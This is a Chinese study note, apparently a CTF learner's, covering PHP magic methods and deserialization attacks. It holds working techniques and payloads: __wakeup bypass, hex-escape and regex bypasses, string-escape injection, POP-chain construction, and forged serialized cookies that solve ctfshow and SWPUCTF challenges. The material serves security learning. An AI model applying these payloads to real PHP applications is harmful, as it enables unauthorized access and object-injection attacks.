&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __sleep() &#123;        echo &quot;It is called when the serialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = base64_encode($this-&gt;name);        return array(&#x27;name&#x27;, &#x27;age&#x27;); //它必须返回一个值，该值的元素是返回的属性的名称    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.echo serialize($person);echo &#x27;&lt;br/&gt;&#x27;;显示结果如下：It is called when the serialize() method is called outside the class.O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;

__toString使用 echo 方法直接打印对象时，将调用__toString () 方法。
注意：此方法必须返回一个字符串，否则将在 E_RECOVERABLE_ERROR 级别上引发致命错误。而且您也不能在__toString () 方法中抛出异常
public function __toString()   &#123;       return  &#x27;go go go&#x27;;   &#125;

当然, 因为 PHP 是一个弱类型语言, 很多情况对象会被隐式转换成字符串, 比如说

== 与字符串比较时会被隐式转换
字符串操作 (str系列函数), 字符串拼接, addslashes
一些参数需要为字符串的参数: class_exists , in_array(第一个参数), SQL 预编译语句, md5, sha1等
print, echo 函数

__get当试图访问对象中未定义或不可见的属性时会被自动调用
例子如下：
&lt;?phpclass Person&#123;    private $name;    private $age;    function __construct($name=&quot;&quot;, $age=1)    &#123;        $this-&gt;name = $name;        $this-&gt;age = $age;    &#125;    public function __get($propertyName)    &#123;           if ($propertyName == &quot;age&quot;) &#123;            if ($this-&gt;age &gt; 30) &#123;                return $this-&gt;age - 10;            &#125; else &#123;                return $this-&gt;$propertyName;            &#125;        &#125; else &#123;            return $this-&gt;$propertyName;        &#125;    &#125;&#125;$Person = new Person(&quot;John&quot;, 60);echo &quot;Name：&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;;echo &quot;Age：&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; 显示结果如下：Name: JohnAge: 50

__setset ($property,$value) 方法用于设置类的私有属性。分配了未定义的属性后，将触发 set () 方法，并且传递的参数是设置的属性名称和值。例子如下：
&lt;?phpclass Person&#123;    private $name;    private $age;    public function __construct($name=&quot;&quot;,  $age=25)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;    &#125;    public function __set($property, $value) &#123;        if ($property==&quot;age&quot;)        &#123;            if ($value &gt; 150 || $value &lt; 0) &#123;                return;            &#125;        &#125;        $this-&gt;$property = $value;    &#125;    public function say()&#123;        echo &quot;My name is &quot;.$this-&gt;name.&quot;,I&#x27;m &quot;.$this-&gt;age.&quot; years old&quot;;    &#125;&#125;$Person=new Person(&quot;John&quot;, 25); //请注意，类初始化并为“name”和“age”分配初始值。$Person-&gt;name = &quot;Lili&quot;;     // &quot;name&quot; 属性值被成功修改。如果没有__set()方法，程序将报错。$Person-&gt;age = 16; // &quot;age&quot;属性修改成功。$Person-&gt;age = 160; //160是无效值，因此修改失败。$Person-&gt;say();  //输出:My name is Lili, I&#x27;m 16 years old。

__invoke把对象当做函数调用时会使用, 例如 $foo()
当然不仅限于显式调用, 将其作为回调函数 (例如 array_map作为第一个参数传入) 也会调用此函数
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __invoke() &#123;        echo &#x27;This is an object&#x27;;    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.$person();执行结果如下：This is an object

如果坚持使用对象作为方法 (但未定义__invoke () 方法)，会报错
__call调用未定义方法时会调用
该方法接受两个参数。第一个参数为未定义的方法名称，第二个参数则为传入方法的参数构成的数组，语法如下：
function __call(string $function_name, array $arguments)&#123;    // method body&#125;

实例：
&lt;?phpclass Person&#123;                                 function say()    &#123;           echo &quot;Hello, world!&lt;br&gt;&quot;;    &#125;         function __call($funName, $arguments)    &#123;          echo &quot;The function you called：&quot; . $funName . &quot;(parameter：&quot; ;  // Print the method&#x27;s name that is not existed.          print_r($arguments); // Print the parameter list of the method that is not existed.          echo &quot;)does not exist!！&lt;br&gt;\n&quot;;                       &#125;                                         &#125;$Person = new Person();           $Person-&gt;run(&quot;teacher&quot;); // If the method which is not existed is called within the object, then the __call() method will be called automatically.$Person-&gt;eat(&quot;John&quot;, &quot;apple&quot;);             $Person-&gt;say();显示结果The function you called: run (parameter: Array([0] =&gt; teacher)) does not exist!The function you called: eat (parameter: Array([0] =&gt; John[1] =&gt; apple)) does not exist!Hello world!

__callStatic()当在程序中调用未定义的静态方法，__callStatic() 方法将会被自动调用。
__callStatic()的用法类似于__call()，例子代码与上面例子的基本相似，其中的 ::代表调用静态方法
$Person::run(&quot;teacher&quot;); // 如果此项目内不存在的方法被调用了，那么 __callStatic() 方法将被自动调用。$Person::eat(&quot;John&quot;, &quot;apple&quot;);

__isset如果在对象外部使用 isset () 方法，则有两种情况：
如果该参数是公共属性，则可以使用 isset () 方法确定是否设置了该属性。
如果参数是私有属性，则 isset () 方法将不起作用。当然，只要在类中定义__isset () 方法，就可以在类外部使用 isset () 方法来确定是否设置了私有属性。
当在未定义或不可访问的属性上调用 isset () 或 empty () 时，将调用__isset () 方法。下面是一个例子：
public function __isset($content) &#123;    echo &quot;The &#123;$content&#125; property is private，the __isset() method is called automatically.&lt;br&gt;&quot;;    echo  isset($this-&gt;$content);    &#125;

__unset与 isset () 方法类似，当在未定义或不可访问的属性上调用 unset () 方法时，将调用 unset () 方法 
public function __unset($content) &#123;        echo &quot;It is called automatically when we use the unset() method outside the class.&lt;br&gt;&quot;;        echo  isset($this-&gt;$content);    &#125;&#125;$person = new Person(&quot;John&quot;, 25); // Initially assigned.unset($person-&gt;sex),&quot;&lt;br&gt;&quot;;unset($person-&gt;name),&quot;&lt;br&gt;&quot;;unset($person-&gt;age),&quot;&lt;br&gt;&quot;;

__debugInfo当执行 var_dump() 方法时，__debugInfo() 方法会被自动调用。如果 __debugInfo() 方法未被定义，那么 var_dump 方法或打印出这个对象的所有属性
&lt;?phpclass C &#123;    private $prop;    public function __construct($val) &#123;        $this-&gt;prop = $val;    &#125;    public function __debugInfo() &#123;        return [            &#x27;propSquared&#x27; =&gt; $this-&gt;prop ** 2,        ];    &#125;//返回必须是数组&#125;var_dump(new C(42));执行结果如下：object(C)#1 (1) &#123; [&quot;propSquared&quot;]=&gt; int(1764) &#125;

__set_state () （不懂）从 PHP 5.1.0 开始，在调用 var_export () 导出类代码时会自动调用__set_state () 方法。
__set_state () 方法的参数是一个包含所有属性值的数组，其格式为 array (‘property’&#x3D;&gt; value，…)
在以下示例中，没有定义__set_state () 方法：
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;&#125;$person = new Person(&#x27;John&#x27;);var_export($person);执行结果如下：Person::__set_state(array( &#x27;sex&#x27; =&gt; &#x27;Male&#x27;, &#x27;name&#x27; =&gt; &#x27;John&#x27;, &#x27;age&#x27; =&gt; 25, ))

定义__set_state () 方法：
public static function __set_state($an_array)    &#123;        $a = new Person();        $a-&gt;name = $an_array[&#x27;name&#x27;];        return $a;    &#125;&#125;$person = new Person(&#x27;John&#x27;);$person-&gt;name = &#x27;Jams&#x27;;var_export($person);执行结果如下：Person::__set_state(array( &#x27;sex&#x27; =&gt; &#x27;Male&#x27;, &#x27;name&#x27; =&gt; &#x27;Jams&#x27;, &#x27;age&#x27; =&gt; 25, ))

__clone()在 PHP 中，我们可以使用 clone 关键字通过以下语法克隆对象：
$copy_of_object = clone $object;

但是，使用 clone 关键字只是一个浅拷贝，因为所有引用的属性仍将指向原始变量。
如果在对象中定义了 clone () 方法，则将在复制生成的对象中调用 clone () 方法，该方法可用于修改属性的值 (如有必要)
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __clone()    &#123;        echo __METHOD__.&quot;your are cloning the object.&lt;br&gt;&quot;;        //$this-&gt;name = &quot;Joe&quot; //复制对象时重置姓名为Joe    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.$person2 = clone $person;var_dump(&#x27;persion1:&#x27;);var_dump($person);echo &#x27;&lt;br&gt;&#x27;;var_dump(&#x27;persion2:&#x27;);var_dump($person2);运行结果如下：Person::__clone your are cloning the object.string(9) &quot;persion1:&quot; object(Person)#1 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; string(6) &quot;John&quot; [&quot;age&quot;]=&gt; int(25) &#125;string(9) &quot;persion2:&quot; object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; string(6) &quot;John&quot; [&quot;age&quot;]=&gt; int(25) &#125;

__autoload ()__autoload () 方法可以尝试加载未定义的类。
过去，如果要在程序文件中创建 100 个对象，则必须使用 include () 或 require () 来包含 100 个类文件，或者必须在同一类文件中定义 100 个类;那么使用__autoload () 方法呢，如下所示：
/** * file autoload_demo.php */function  __autoload($className) &#123;    $filePath = “project/class/&#123;$className&#125;.php”;    if (is_readable($filePath)) &#123;        require($filePath);    &#125;&#125;if (ConditionA) &#123;    $a = new A();    $b = new B();    $c = new C();    // …&#125; else if (ConditionB) &#123;    $a = newA();    $b = new B();    // …&#125;

当 PHP 引擎第一次使用类 A 时，如果未找到类 A，则 autoload 方法将被自动调用，并且类名称 “A” 将作为参数传递。因此，我们在 autoload () 方法中需要做的是根据类名找到相应的类文件，然后将其包含在内。如果找不到该文件，则 php 引擎将抛出异常
__unserialize()
__unserialize() 是 PHP 7.4 引入的方法，提供了一种更安全、更灵活的方式来控制对象反序列化过程。它允许开发者处理从序列化字符串恢复对象时的具体逻辑

如果类中定义了 __unserialize() 方法：

当使用 unserialize() 函数反序列化对象时，__unserialize() 方法会被调用。
这是因为 __unserialize() 提供了更直接的控制反序列化过程的方式，优先级高于 __wakeup()。

如果类中未定义 __unserialize() 方法：

当使用 unserialize() 函数反序列化对象时，如果 __unserialize() 不存在但 __wakeup() 存在，那么 __wakeup() 会被调用。

魔术方法执行顺序对于魔术方法的调用顺序, 不同的情况下会有不同的顺序
首先, 一个对象在其生命周期中一定会走过 destruct, 只有当对象没有被任何变量指向时才会被回收
当使用 new 关键字来创建一个对象时会调用 construct
对于序列化&#x2F;反序列化时的情况:
序列化时会先调用 sleep 再调用 destruct, 故而完整的调用顺序为: sleep -&gt; (变量存在) -&gt; destruct
反序列化时如果有 __wakeup 则会调用 __wakeUp 而不是 __construct, 故而逻辑为 __wakeUp/__construct -&gt; (变量存在)
当然，也有不遵守这个顺序的情况
绕过非公有字段绕过对于 php7.1+ 版本, 反序列化时若提供的命名为公有字段格式, 会忽略掉非公有字段的访问性, 而可以绕过直接直接对其赋值
这个时候我们有两种方法可以

在写序列化 php 文件时可以直接将字段改成 public
修改序列化后的字段名, 改为公开字段的样式, 记得修改字符数

绕过 __wakeup影响版本php5&lt;5.6.25,php7&lt;7.010
简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
例如:
O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;

改为:
O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;

[极客大挑战 2019]PHP __wakeup()绕过&lt;?php  include &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];  $res=unserialize(@$select);&lt;?php  include &#x27;flag.php&#x27;;  error_reporting(0);  class Name&#123;   private $username = &#x27;nonono&#x27;;   private $password = &#x27;yesyes&#x27;;   public function __construct($username,$password)&#123;   $this-&gt;username = $username;   $this-&gt;password = $password;   &#125;   function __wakeup()&#123;   $this-&gt;username = &#x27;guest&#x27;;   &#125;   function __destruct()&#123;   if ($this-&gt;password != 100) &#123;   echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;   echo &quot;You name is: &quot;;   echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;   echo &quot;You password is: &quot;;   echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;   die();   &#125;   if ($this-&gt;username === &#x27;admin&#x27;) &#123;   global $flag;   echo $flag;   &#125;else&#123;   echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;   die();   &#125;   &#125;  &#125;

看源码我们需要password&#x3D;100,username&#x3D;admin,但反序列化过程中wakeup方法里会把username赋值为guest；
&lt;?php  class Name&#123;   private $username = &#x27;admin&#x27;;   private $password = &#x27;100&#x27;;   public function __construct($username,$password)&#123;   $this-&gt;username = $username;   $this-&gt;password = $password;   &#125;  &#125;  $a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  echo urlencode(serialize($a));  //echo serialize($a);  //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D  ?&gt;

先生成一个对象，然后序列化，修改对象个数为大于2并Url编码，套到题目里面去，得到flag
十六进制绕过字符匹配我们可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测，例子如下：
&lt;?phpclass Read&#123;    public $name;    public function __wakeup()    &#123;        if ($this-&gt;name == &quot;flag&quot;)        &#123;            echo &quot;You did it!&quot;;        &#125;    &#125;&#125;$str = &#x27;&#x27;;if (strpos($str, &quot;flag&quot;) === false)&#123;    $obj = unserialize($str);&#125;else&#123;    echo &quot;You can&#x27;t do it!&quot;;&#125;

这里检测了是否包含 flag 字符, 我们可以尝试使用 flag 的十六进制 \66\6c\61\67 来绕过, 构造以下:
&#x27;O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;&#x27;

利用好引用对于需要判断两个变量是否相等时, 我们可以考虑使用引用来让两个变量始终相等.
这个相当于一个指针一样, 代码如下:
class A &#123;    public $a;    public $b;&#125;$a = new A();$a-&gt;a = &amp;$a-&gt;b;echo serialize($a);

序列化后的结果为:
O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;

对象反序列化正则绕过有些时候我们会看到^O:\d+ 这种的正则表达式, 要求开头不能为对象反序列化
这种情况我们有以下绕过手段

由于\d只判断了是否为数字, 则可以在个数前添加+号来绕过正则表达式
将这个对象嵌套在其他类型的反序列化之中, 例如数组

当然, 第一种更佳. 因为若不只匹配开头则仍可以绕过
字符逃逸对于字符逃逸, 由于 PHP 序列化后的字符类型中的引号不会被转义, 对于字符串末尾靠提供的字符数量来读取, 对于服务端上将传入的字符串实际长度进行增加或减少(例如替换指定字符到更长&#x2F;短的字符), 我们就可以将其溢出并我们的恶意字符串反序列化.
由短变长&lt;?phpclass Book&#123;    public $id = 114514;    public $name = &quot;Kengwang 学习笔记&quot;; // 可控    public $path = &quot;Kengwang 学习笔记.md&quot;;&#125;function filter($str)&#123;    return str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, $str);&#125;$exampleBook = new Book();echo &quot;[处理前]&lt;br&gt;\n&quot;;$ser = serialize($exampleBook);echo $ser . &quot;&lt;br&gt;\n&quot;;echo &quot;[处理后]&lt;br&gt;\n&quot;;$ser = filter($ser);echo $ser . &quot;&lt;br&gt;\n&quot;;echo &quot;[文件路径] &lt;br&gt;\n&quot;;$exampleBook = unserialize($ser);echo $exampleBook-&gt;path . &quot;&lt;br&gt;\n&quot;;

这种情况下我们通常只能控制其中的一个字符变量,  而不是整个反序列话字符串. 题目会将其先序列化, 再进行字符处理, 之后再反序列化(类似于将对象存储到数据库)
此代码会将其中的单引号过滤成为转义+单引号, 此时字符串的长度会进行变化, 我们可以利用这一点使 name 中的东西溢出到 path 中.
我们构造恶意字符串时需要先将前面的双引号闭合,同时分号表示此变量结束. 在攻击变量结束之后我们需要用 ;&#125; 结束当前的序列化, 会自动忽略掉这之后的序列化
我们的每一个单引号会变成两个字符, 于是可以将我们的恶意字符给顶掉, 我们只需要提供恶意字符串长度个会被放大变成两倍的字符.
当然如果不是两倍, 我们可以灵活运用 + 来进行倍数配齐
例如我们需要恶意构造  &quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:, 长度为 41, 于是我们提供 41 个&#39;，最终给 name 的赋值为
Kengwang 的学习笔记&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:

运行结果如下：
[处理前]O:4:&quot;Book&quot;:3:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:106:&quot;Kengwang 的学习笔记&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[处理后]O:4:&quot;Book&quot;:3:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:106:&quot;Kengwang 的学习笔记\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[文件路径]flag

可以看到 path 被替换成了 flag
由长变短&lt;?phpclass Book&#123;    public $id = 1919810;    public $name = &quot;Kengwang 的学习笔记&quot;; // 可控    public $description = &quot;The WORST Web Security Leaning Note&quot;; // 可控    public $path = &quot;Kengwang 的学习笔记.md&quot;;&#125;function filter($str)&#123;    return str_replace(&quot;&#x27;&quot;, &quot;&quot;, $str);&#125;$exampleBook = new Book();echo &quot;[处理前]\n&quot;;$ser = serialize($exampleBook);echo $ser . &quot;\n&quot;;echo &quot;[处理后]\n&quot;;$ser = filter($ser);echo $ser . &quot;\n&quot;;echo &quot;[文件路径] \n&quot;;$exampleBook = unserialize($ser);echo $exampleBook-&gt;path . &quot;\n&quot;;

正常序列化后的字符串：
O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:24:&quot;Kengwang 的学习笔记&quot;;s:11:&quot;description&quot;;s:35:&quot;The WORST Web Security Leaning Note&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;

我们需要让 &quot;;s:11:&quot;description&quot;;s:35: 被吞掉作为 name 变量的值, description的前引号会将其闭合, 此后 description 中的就会逃逸出成为反序列化串, 于是我们在 name 中填入 要被吞掉的字符数目 个&#39;, 于是尝试
将 name 赋值为 Kengwang Note&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;
将 description 赋值为 ;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;
得到结果如下
[处理前]O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:39:&quot;Kengwang Note&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:11:&quot;description&quot;;s:55:&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习 笔记.md&quot;;&#125;[处理后]O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:39:&quot;Kengwang Note&quot;;s:11:&quot;description&quot;;s:55:&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[文件路径]flag

POP链构造做这种题关键是php魔术方法，构造POP先找到头部和尾部，头部就是用户可控的地方，也就是可以传入参数的地方，然后找尾部，比如关键代码，eval,file_put_contents这种，然后从尾部开始推导，根据魔术方法的特性，一步一步往上触发
难的是要找出这条链，直接上实例来理解
[SWPUCTF 2021 新生赛]pop&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123;    private $admin = &#x27;aaa&#x27;;    protected $passwd = &#x27;123456&#x27;;    public function Getflag()&#123;        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &#x27;nono&#x27;;        &#125;    &#125;&#125;class w22m&#123;    public $w00m;    public function __destruct()&#123;        echo $this-&gt;w00m;    &#125;&#125;class w33m&#123;    public $w00m;    public $w22m;    public function __toString()&#123;        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();        return 0;    &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);

POP链入手，先找关键代码，然后推断
需要admin为w44m，passwd为08067 才能得到flag
if($this-&gt;admin &#x3D;&#x3D;&#x3D; ‘w44m’ &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D;’08067’){
echo $flag;
发现可以利用$this-&gt;w00m-&gt;{$this-&gt;w22m}();
这个地方，修改w22m&#x3D;getflag，那么这个地方就有getflag()函数了
在类w22m中 方法__destruct中echo $this-&gt;w00m;echo了一个对象，会触发tostring方法
前面魔术方法提到
__toString 当一个对象被当作一个字符串被调用。这样的话我们便可以利用to_Sting方法里面的代码了，传参点是w00m，
链子构造为 w22m::__destruct-&gt;w33m::toString-&gt;w44m::getflag
poc如下，这里要用urlencode，因为我们前面提到private和protected生产序列化有不可见字符
&lt;?php  class w44m&#123;   private $admin = &#x27;w44m&#x27;;   protected $passwd = &#x27;08067&#x27;;  &#125;  class w22m&#123;   public $w00m;   public function __destruct()&#123;   echo $this-&gt;w00m;   &#125;  &#125;  class w33m&#123;   public $w00m=&quot;&quot;;   public $w22m=&quot;getflag&quot;;   public function __toString()&#123;   $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();   return 1;   &#125;  &#125;  $a=new w22m();  $a-&gt;w00m=new w33m();  $a-&gt;w00m-&gt;w00m=new w44m();  echo urlencode( serialize($a));  

CTFshowweb254&lt;?php    error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题并没有考到反序列化的相关知识点，而是考你阅读代码的能力，这题的得到flag的前提是get传参进来的username和password要和类中一开始定义的值一样
所以我们get传参：?username=xxxxxx&amp;password=xxxxxx
得到flag，题目解决
web255&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题开始简单的反序列化了，这次类中的函数login不会在改变$isVip的值，而是单纯地用作判断
观察下面的代码逻辑，首先要get传参进两个变量username和password的值，然后要让这两个值的等于原本类中的值，成立了之后会判断函数checkVip()的布尔值要为true，符合要求后才会得到flag
因为题目中有反序列化的步骤，所以我们要自己构造序列化的代码，如下：
&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;root&#x27;;    public $password=&#x27;root&#x27;;    public $isVip=true;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到编码后的序列化为：O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
回到题目环境，get传参：?username=root&amp;password=root，然后在hackbar中的cookie处写入：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
发送，得到flag，题目解决
web256&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题和上面一道题的区别在于username的值和password的值要不一样，改一下就可以了，序列化后的值如下：
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22flag%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

得到flag，题目解决
